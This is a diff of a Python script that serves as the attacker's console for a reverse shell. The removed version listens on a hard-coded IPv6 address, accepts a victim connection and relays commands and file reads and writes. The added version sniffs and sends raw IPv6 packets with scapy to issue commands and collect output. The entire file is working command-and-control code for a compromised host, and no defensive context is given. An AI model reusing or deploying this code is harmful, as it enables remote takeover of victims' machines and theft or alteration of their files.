@@ -1,87 +1,65 @@
-import socket
-
-BUFFER_SIZE = 1024
-attacker_server = socket.socket(socket.AF_INET6, socket.SOCK_STREAM) 
-
-# lets the attacker server listen on the specified port number
-def attacker_server_binder(hostname, port_number):
-    attacker_server.bind((hostname, port_number))
-    attacker_server.listen(5)
-
+from scapy.all import *
 
 # listening for connections
 def target_client_connection_receiver():
+    connection_establishment_command = "CONNECTION_FROM_CLIENT"
     while True:
         # receive connection from target client
-        target_client, target_client_address = attacker_server.accept()
-        
-        if(target_client != None):
-            break
+        packet = sniff(count=1, filter="tcp and dst port 12345")
+        extracted_packet = packet[0]['IPv6']
+        try:
+            target_IP = extracted_packet.src
+            data = extracted_packet.load.decode('utf-8')
+            if(data == connection_establishment_command):
+                break
+        except:
+            pass
+    
     print("Connection established to target\n$reverse_shell: ", end="")
-    return target_client
-
+    return target_IP
 
 # connects to the client being targeted
-def send_data(data, target_client):
-    
-    target_client.send(bytes(data, 'utf-8'))
-    acknowledgement =  target_client.recv(BUFFER_SIZE)
-    if(acknowledgement == b'ACK'):
-        # print("Data received at target end")
-        receive_data(target_client)
-    else:
-        print("Acknowledgement receipt not received.\n$reverse_shell: ", end = "")
+def send_data(data, target_IP):
+    packet = IPv6(dst=target_IP)/TCP(sport=12345, dport=12345)/data
+    send(packet, verbose=0)
+    receive_data(target_IP)
 
 
-def receive_data(target_client):
+def receive_data(target_IP):
     response = ""
     while True:
-        received_data = target_client.recv(BUFFER_SIZE)
-        received_data = received_data.decode('utf-8')
-        response = response + received_data
-        if(len(received_data) < BUFFER_SIZE):
-            break
-    print(response + "\n$reverse_shell: ", end= "")
+        packet = sniff(count=1, filter= "dst port 12345")
+        try: 
+            extracted_packet = packet[0]['IPv6']
+            if(target_IP == extracted_packet.src):
+                try:
+                    response = extracted_packet.load
+                    response = response.rstrip()
+                    response = str(response)
+                    first_apostrophe_index = response.index('\'')
+                    response = response[first_apostrophe_index + 1 : ]
+                    response = response[: len(response) - 1]
+                    print(response)
+                    if(response == "END_COMM"):
+                        break
+                except:
+                    pass
+        except:
+            pass
+    print("\n$reverse_shell: ", end= "")
+    
 
     
-def command_handler(target_client):
+def command_handler(target_IP):
     data = str(input())
-    try:
-        data.index('file')
-        file_handler(target_client, data)
-        return
-    except:
-        pass
-    send_data(data, target_client)
+    send_data(data, target_IP)
 
-
-def file_handler(target_client, command):
-    target_client.send(bytes(command, 'utf-8'))
-    acknowledgement = target_client.recv(BUFFER_SIZE)
-    if(acknowledgement == b'ACK'):
-        pass
-    data_splits = command.split(' ')
-    mode = data_splits[2]
-    if(mode == 'r'):
-        receive_data(target_client)
-            
-    elif(mode == 'w' or mode == 'a'):
-
-        print("enter FILE_UPDATE_QUIT to end data transfer")
-        while True:
-            data = str(input("--> "))
-            target_client.send(bytes(data, 'utf-8'))
-            if(data == 'FILE_UPDATE_QUIT'):
-                break
-        receive_data(target_client)
 
 def main():
-    attacker_server_binder("2409:4063:2291:13d1:c421:695c:7d00:5173", 1234)
 
     # receive connection from target client
-    target_client = target_client_connection_receiver()
-
+    target_IP = target_client_connection_receiver()
     while True:
-        command_handler(target_client)
+        command_handler(str(target_IP))
 
 main()
